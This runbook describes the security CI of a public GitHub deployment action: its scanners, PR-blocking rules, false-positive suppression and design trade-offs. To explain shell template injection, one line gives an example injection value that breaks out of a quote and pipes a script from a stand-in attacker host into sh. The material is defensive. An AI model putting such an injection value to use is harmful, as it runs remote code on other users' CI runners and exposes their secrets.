# Security CI — runbook

How this repository checks itself, what blocks a pull request, and how to
suppress a false positive without disabling a control.

**Cost: $0.** Every tool is MIT or Apache 2.0. The reporter uses only Node's
standard library — no `package.json`, no `npm install`, no lockfile. In a
security-focused public action the tooling must not enlarge the very supply
chain the action exists to keep small.

---

## 1. What runs, and where

| Check | Tool | Trigger | Blocks a PR? |
|---|---|---|---|
| Secrets in git **history** | gitleaks (binary, MIT) | PR + push + nightly | Yes, if this PR introduced it |
| Filesystem / IaC / licence | Trivy | PR + push + weekly | Yes, if CRITICAL/HIGH and introduced by this PR |
| Action SHA pinning, shell injection, workflow permissions | `scripts/ci/repo-rules.mjs` | PR | **Pinning always. Others if introduced** |
| AWS WAF shapes in shipped examples | `scripts/ci/waf/waf-lint.mjs` | PR | No — advisory |
| Workflow validity, YAML, shellcheck | actionlint, yamllint, shellcheck | PR + push | Yes — via `test.yml` |
| Dependency CVEs | OWASP Dependency-Check | push + weekly | No — advisory (see §5) |
| Static analysis | SonarQube | PR + push | No — advisory |
| Live-site DAST | OWASP ZAP | PR + push + weekly | No — advisory, and skipped unless `SCAN_TARGET_URL` is set |

### Two required checks

- **`test`** — does it lint and shellcheck?
- **`security-report`** — is it safe?

`pr-security.yml` deliberately funnels every scanner through
`security-report`, so branch protection needs one security check rather than
one per scanner, and the tiered blocking rule lives in exactly one testable
function — `decideBlockingFindings` in `scripts/ci/security/verdict.mjs`.

### Why gitleaks and Trivy no longer trigger on pull requests

They used to fail pull requests on their own, which contradicted this gate and
produced two different answers to "is this PR safe?". They now run on
push-to-`main` and on their schedules, where their job is to feed GitHub code
scanning and keep the README badges meaningful. **Pull-request coverage is
unchanged** — it is delivered through one attributed check instead of several.

---

## 2. What the pull-request comment tells you

One comment per pull request, **updated in place** on every push — a 12-commit
PR must not accumulate 12 comments. Findings are grouped by the developer whose
commit last touched the line, resolved with `git blame` and the GitHub commits
API, and `@`-mentioned.

- **No label** — exact. The rule is documented and deterministic.
- **`(approximated)`** — a heuristic, not a proven condition. Worth a look, not
  proof.
- **`(pre-existing)`** — the blamed commit predates this pull request.
  Reported for visibility; does not block.
- **Secret VALUES are never printed.** The normalizer refuses to read gitleaks'
  matched-text field, because this is a **public** repository and the comment is
  world-readable and copied into notification emails. Read the value from the
  `pr-security-reports` artifact if you need to identify it.

---

## 3. The rules this repository enforces on itself

`CONTRIBUTING.md` has always stated these. Until v1.1.0 nothing checked them —
and a rule the code does not check is a suggestion.

| Rule id | What it catches | Blocks |
|---|---|---|
| `repo-rules/unpinned-action-reference` | A `uses:` on a mutable tag instead of a 40-character SHA | **Always** |
| `repo-rules/shell-template-injection` | `${{ inputs.* }}` / `${{ github.event.* }}` interpolated straight into a `run:` or `script:` block | If introduced |
| `repo-rules/missing-workflow-permissions` | A workflow with no `permissions:` block | If introduced |
| `repo-rules/missing-shell-hardening` | `action.yml` shell without `set -euo pipefail` | If introduced |
| `repo-rules/missing-input-description` | An action input with no `description` | If introduced |

### Why unpinned actions always block

A mutable tag is exploitable by whoever controls the upstream repository,
independently of which commit introduced the reference. Deferring the fix is not
a control — it is exposure that persists until the pin lands. Resolve a SHA with:

```bash
git ls-remote https://github.com/OWNER/REPO refs/tags/TAG
```

and keep the human-readable tag as a trailing comment:

```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

**Exempt:** `mujeeb-enfin/deploy-to-vps@v1` in the example consumer workflows.
Consumers are *supposed* to use the floating major tag — that is the point of
publishing `v1` — so pinning those would teach users the wrong thing.

### Why shell template injection is CRITICAL here

GitHub substitutes a `${{ }}` expression into the script text **before** the
shell parses it. A caller-supplied value such as

```
x"; curl https://evil.example/s | sh; echo "
```

closes the quote and executes arbitrary commands. In a public action that runner
belongs to a **consumer**, holding **their** secrets. Pass the value through
`env:` and reference it as `"$VAR"`, so the shell treats it as data.

---

## 4. Suppressing a false positive — properly

**Tune, never blanket-disable.** A removed rule is an unenforced rule.

| Tool | Where | How |
|---|---|---|
| gitleaks | `.gitleaks.toml` | A **narrow** regex or path, with a comment saying why it is safe |
| Trivy | `.trivyignore` | One id per line, each with a comment and a re-review date |
| repo-rules | `scripts/ci/repo-rules.mjs` | Add to `PINNING_EXEMPT_PATTERNS` with a stated reason — the array carries a `reason` field for exactly this |
| ZAP | workflow `rules_file_name` | Downgrade the specific rule, stating why it cannot apply |

### If gitleaks finds a real secret

1. **Rotate the credential first.** Deleting the line does nothing — the value
   lives in every clone of the history forever.
2. Purge it from history (`git filter-repo` / BFG) and force-push.
3. Only then, if it proves to be a false positive, add a narrow allowlist entry.

---

## 5. Known limitations — stated, not hidden

- **OWASP Dependency-Check finds nothing here.** This repository has no
  `package.json`, no lockfile, and no dependency manifest of any kind — a
  composite action has nothing for it to analyse. It is retained for coverage
  reporting and because the badge is public-facing, but it is **advisory** and
  must not be read as evidence that dependencies were verified.
- **ZAP scans a site that is not built from this repository.** It only runs when
  `SCAN_TARGET_URL` is configured, and is advisory for that reason.
- **The AWS WAF linter has no HTTP surface to inspect.** It checks the URLs in
  shipped documentation and examples — because a public action's samples get
  copied verbatim into other people's pipelines — and carries the documented
  AWS rule core for when this action grows an endpoint of its own.
- **No SAST.** Nothing here performs data-flow/taint analysis on the embedded
  shell. shellcheck covers syntax and common bug patterns, not taint.
- **Fork pull requests** get a read-only `GITHUB_TOKEN`, so the comment cannot be
  posted. The reporter detects this and writes the job summary instead; the exit
  code still enforces the verdict.

---

## 6. Running the checks locally

No install step — these use only the Node already on your machine.

```bash
node scripts/ci/repo-rules.mjs --out=reports/repo-rules.json --exit-code
node scripts/ci/waf/waf-lint.mjs --out=reports/waf-lint.json
node scripts/ci/security-report.mjs --repo-rules=reports/repo-rules.json
node --test scripts/ci/__tests__/security.test.mjs
```

Outside a pull request the reporter prints findings without attribution and does
not set an exit code — there is no diff to scope against.

For the YAML and shell linters, see `CONTRIBUTING.md`.

---

## 7. Design notes

**Scanners never fail; the reporter decides.** Every scan step is configured to
exit 0. Spreading `exit-code:` flags across scanners makes "why did my PR go
red?" unanswerable and needs one required check per scanner.

**A crashed scanner must never pass the gate.** `pr-security.yml` explicitly
fails when the scan job did not succeed. Otherwise a dead job uploads no
reports, the download step is `continue-on-error`, and the reporter would see
zero findings and declare a clean pass — "did not run" rendered as "found
nothing".

**Attribution degrades safely and loudly.** If the base ref cannot be resolved
(a shallow clone), every finding is treated as pre-existing and nothing blocks.
That is the safe direction, but it silently de-fangs the gate — so it is logged
at `error` level with the consequence spelled out, and blame coverage is
reported on every run.
